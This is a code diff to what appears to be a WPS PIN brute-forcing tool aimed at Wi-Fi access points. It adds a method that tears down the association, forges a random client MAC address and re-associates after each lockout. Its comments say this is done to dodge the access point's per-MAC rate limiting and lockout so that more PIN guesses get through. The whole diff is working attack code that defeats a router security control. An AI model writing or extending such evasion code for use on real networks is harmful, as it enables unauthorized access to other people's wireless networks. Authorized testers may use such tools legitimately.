@@ -248,6 +248,13 @@ class WpsCampaign:
                 beacon_locked = self._beacon_locked()
                 if self.lock.is_locked(beacon_locked):
                     await self._handle_lock(beacon_locked)
+                    # Per-MAC rate-limiting is common: the AP grants one attempt
+                    # per source MAC then NACKs everything from that MAC, AND
+                    # times out our association during the wait. Rotating MAC +
+                    # re-associating before the next attempt sidesteps both —
+                    # free on permissive APs, the difference between "stuck
+                    # forever" and "one PIN per lock cycle" on locked-down ones.
+                    self._rotate_mac()
                     continue
 
                 pin = self._next_pin()
@@ -324,6 +331,27 @@ class WpsCampaign:
         if self._lock_end_at is None:
             return 0.0
         return max(0.0, self._lock_end_at - time.monotonic())
+
+    def _rotate_mac(self) -> None:
+        """Tear down the association + transport and rebuild under a fresh
+        forged MAC on the next ``_ensure_session()``. Called after a lock cycle
+        so we look like a fresh client to the AP (sidesteps per-MAC rate-limit
+        AND the AP's STA-inactivity timeout silently dropping us during the
+        wait)."""
+        if self.transport is not None:
+            self.transport.stop()
+        if self.assoc is not None:
+            self.assoc.stop()
+        self.assoc = None
+        self.transport = None
+        old = self.our_mac
+        self.our_mac = random_client_mac()
+        logger.debug("WPS rotated MAC %s -> %s", old.hex(), self.our_mac.hex())
+        self.log("[dim]rotated source MAC + re-associating to dodge "
+                 "per-MAC rate-limit[/dim]")
+        # A fresh MAC means a different (pin, result) signature meaning is moot
+        # — reset so the first attempt under the new MAC always logs.
+        self._last_attempt_sig = None
 
     def _log_attempt(self, pin: str, out: AttemptOutcome,
                      prev_first_half: Optional[str]) -> None:
